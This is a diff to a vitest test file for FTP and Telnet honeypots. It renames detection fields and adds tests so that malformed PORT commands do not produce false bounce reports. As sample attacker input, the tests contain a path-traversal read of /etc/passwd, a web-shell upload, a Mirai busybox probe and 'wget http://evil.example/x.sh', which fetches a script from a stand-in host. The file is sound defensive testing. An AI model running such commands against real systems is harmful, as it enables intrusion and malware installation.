@@ -1,14 +1,11 @@
 import net from "node:net";
 import { afterEach, describe, expect, it } from "vitest";
-import { FtpHoneypot, MemoryStore, TelnetCodec, TelnetHoneypot, fakeShellOutput } from "../src/index.js";
-import type { HoneypotHit } from "../src/index.js";
+import { FtpHoneypot, MemoryStore, TelnetCodec, TelnetHoneypot, fakeShellOutput, type HoneypotHit } from "../src/index.js";
+import type { FtpIncident } from "../src/protocols/ftp/types.js";
+import { portOf } from "./helpers.js";
 
 /** Let the `void this.report(...)` calls settle before asserting on what was recorded. */
 const settle = (ms = 60): Promise<void> => new Promise((r) => setTimeout(r, ms));
-
-function portOf(honeypot: { address: () => unknown }): number {
-  return (honeypot.address() as { port: number }).port;
-}
 
 /**
  * Drives a line-per-reply protocol: send the next scripted line each time the server
@@ -29,6 +26,24 @@ function session(port: number, lines: string[], timeoutMs = 3000): Promise<strin
     socket.on("close", () => resolve(transcript));
     socket.on("error", reject);
   });
+}
+
+/** Runs one FTP command against a fresh connection and returns the incidents it produced. */
+async function ftpCommand(command: string): Promise<FtpIncident[]> {
+  const incidents: FtpIncident[] = [];
+  const honeypot = new FtpHoneypot({ host: "127.0.0.1", port: 0, onIncident: (incident) => void incidents.push(incident) });
+  await honeypot.listen();
+  const port = (honeypot.address() as net.AddressInfo).port;
+
+  const socket = net.connect(port, "127.0.0.1");
+  await new Promise((resolve) => socket.once("connect", resolve));
+  await new Promise((resolve) => socket.once("data", resolve)); // the 220 banner
+  socket.write(`${command}\r\n`);
+  await new Promise((resolve) => setTimeout(resolve, 120));
+  socket.destroy();
+  await new Promise((resolve) => setTimeout(resolve, 80));
+  await honeypot.close();
+  return incidents;
 }
 
 describe("FTP honeypot", () => {
@@ -53,14 +68,14 @@ describe("FTP honeypot", () => {
     return { port: portOf(ftp), hits };
   }
 
-  const findingsOf = (hits: HoneypotHit[]): string[] => hits.map((h) => h.detections[0]?.detectorId ?? "");
+  const findingsOf = (hits: HoneypotHit[]): string[] => hits.map((h) => h.detections[0]?.detector ?? "");
 
   it("captures a USER/PASS brute-force attempt in the clear", async () => {
     const { port, hits } = await start();
     await session(port, ["USER admin", "PASS hunter2", "QUIT"]);
     await settle();
 
-    const auth = hits.find((h) => h.detections[0]?.detectorId === "ftp-auth-bruteforce");
+    const auth = hits.find((h) => h.detections[0]?.detector === "ftp-auth-bruteforce");
     expect(auth).toBeTruthy();
     expect(auth?.method).toBe("FTP");
     expect(auth?.headers["ftp-user"]).toBe("admin");
@@ -84,7 +99,7 @@ describe("FTP honeypot", () => {
     await session(port, ["USER anonymous", "PASS x@x", "PORT 10,0,0,1,4,1", "QUIT"]);
     await settle();
 
-    const bounce = hits.find((h) => h.detections[0]?.detectorId === "ftp-bounce");
+    const bounce = hits.find((h) => h.detections[0]?.detector === "ftp-bounce");
     expect(bounce).toBeTruthy();
     expect(bounce?.headers["ftp-bounce-target"]).toBe("10.0.0.1:1025");
 
@@ -110,7 +125,7 @@ describe("FTP honeypot", () => {
     await session(port, ["USER anonymous", "PASS x@x", "RETR ../../etc/passwd", "QUIT"]);
     await settle();
 
-    const traversal = hits.find((h) => h.detections[0]?.detectorId === "ftp-traversal");
+    const traversal = hits.find((h) => h.detections[0]?.detector === "ftp-traversal");
     expect(traversal).toBeTruthy();
     expect(traversal?.body).toContain("../../etc/passwd");
   });
@@ -121,7 +136,7 @@ describe("FTP honeypot", () => {
     await settle();
 
     expect(transcript).toContain("230 Login successful");
-    const commands = hits.filter((h) => h.detections[0]?.detectorId === "ftp-command").map((h) => h.body);
+    const commands = hits.filter((h) => h.detections[0]?.detector === "ftp-command").map((h) => h.body);
     expect(commands).toContain("CWD /var/www");
     expect(commands).toContain("STOR shell.php");
   });
@@ -190,7 +205,7 @@ describe("FTP honeypot", () => {
       method: "GET",
       path: "/.env",
       headers: {},
-      detections: [{ detectorId: "sensitive-file", reason: "seed", score: 50 }],
+      detections: [{ detector: "sensitive-file", summary: "seed", score: 50 }],
       score: 50,
       totalScore: 50,
       respondedWith: "block",
@@ -316,7 +331,7 @@ describe("Telnet honeypot", () => {
     ]);
     await settle();
 
-    const auth = hits.find((h) => h.detections[0]?.detectorId === "telnet-auth-bruteforce");
+    const auth = hits.find((h) => h.detections[0]?.detector === "telnet-auth-bruteforce");
     expect(auth).toBeTruthy();
     expect(auth?.method).toBe("TELNET");
     expect(auth?.headers["telnet-user"]).toBe("root");
@@ -334,7 +349,7 @@ describe("Telnet honeypot", () => {
     ]);
     await settle();
 
-    const auth = hits.find((h) => h.detections[0]?.detectorId === "telnet-auth-bruteforce");
+    const auth = hits.find((h) => h.detections[0]?.detector === "telnet-auth-bruteforce");
     expect(auth?.headers["telnet-user"]).toBe("admin");
   });
 
@@ -360,7 +375,7 @@ describe("Telnet honeypot", () => {
     ]);
     await settle();
 
-    const passwords = hits.filter((h) => h.detections[0]?.detectorId === "telnet-auth-bruteforce").map((h) => h.body);
+    const passwords = hits.filter((h) => h.detections[0]?.detector === "telnet-auth-bruteforce").map((h) => h.body);
     expect(passwords).toEqual(["first", "second"]);
   });
 
@@ -384,11 +399,11 @@ describe("Telnet honeypot", () => {
     });
     await settle(120);
 
-    const commands = hits.filter((h) => h.detections[0]?.detectorId === "telnet-command").map((h) => h.body);
+    const commands = hits.filter((h) => h.detections[0]?.detector === "telnet-command").map((h) => h.body);
     expect(commands).toContain("/bin/busybox MIRAI");
     expect(commands).toContain("wget http://evil.example/x.sh");
 
-    const summary = hits.find((h) => h.detections[0]?.detectorId === "telnet-session");
+    const summary = hits.find((h) => h.detections[0]?.detector === "telnet-session");
     expect(summary).toBeTruthy();
     expect(Number(summary?.headers["telnet-command-count"])).toBeGreaterThanOrEqual(2);
   });
@@ -403,7 +418,7 @@ describe("Telnet honeypot", () => {
     });
     await settle();
 
-    expect(hits.map((h) => h.detections[0]?.detectorId)).toEqual(["telnet-scan"]);
+    expect(hits.map((h) => h.detections[0]?.detector)).toEqual(["telnet-scan"]);
   });
 });
 
@@ -459,5 +474,26 @@ describe("the scripted fake shell", () => {
     expect(fakeShellOutput("nmap")).toBe("nmap: command not found\r\n");
     expect(fakeShellOutput("   ")).toBe("");
     expect(fakeShellOutput("ls")).toBe("\r\n");
+  });
+});
+
+describe("an FTP bounce is only reported for a PORT command that actually names one", () => {
+  // `Number()` accepted far more than the protocol's decimal grammar. `Number("")` is 0,
+  // so `PORT ,,,,,` — six empty fields, no address at all — parsed as `0.0.0.0:0` and was
+  // reported as an `ftp-bounce`: the highest-scored FTP finding, 12 points, naming a
+  // third party the client never mentioned. `0x10` and `1e2` were coerced the same way.
+  // A honeypot's output is evidence, and an /ioc.txt consumer downstream cannot tell an
+  // invented victim address from a real one.
+  it("does not invent a bounce from a malformed PORT", async () => {
+    for (const command of ["PORT ,,,,,", "PORT  , , , , , ", "PORT 0x10,0,0,1,0,80", "PORT 1e2,0,0,1,0,80", "PORT 1,2,3,4,5"]) {
+      const bounces = (await ftpCommand(command)).filter((incident) => incident.finding === "ftp-bounce");
+      expect(bounces, command).toHaveLength(0);
+    }
+  }, 20_000);
+
+  it("still reports a genuine bounce", async () => {
+    const bounces = (await ftpCommand("PORT 1,2,3,4,5,6")).filter((incident) => incident.finding === "ftp-bounce");
+    expect(bounces).toHaveLength(1);
+    expect(bounces[0]!.reason).toContain("1.2.3.4:1286");
   });
 });
